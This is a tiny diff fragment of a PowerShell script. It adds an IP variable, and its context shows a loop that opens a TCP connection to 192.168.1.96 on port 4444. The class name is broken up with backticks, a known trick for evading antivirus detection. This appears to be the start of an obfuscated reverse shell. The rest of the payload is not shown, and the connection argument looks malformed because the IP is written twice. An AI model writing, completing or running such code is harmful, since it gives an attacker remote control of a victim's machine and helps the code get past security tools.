@@ -1,3 +1,4 @@
+$ip='192.168.1.96'
 do{
 $v = 4
 $a = New-Object S`ySt`em.N`eT.`s`ock`eTs.TC`PC`li`eNt("$ip 192.168.1.96",4444)
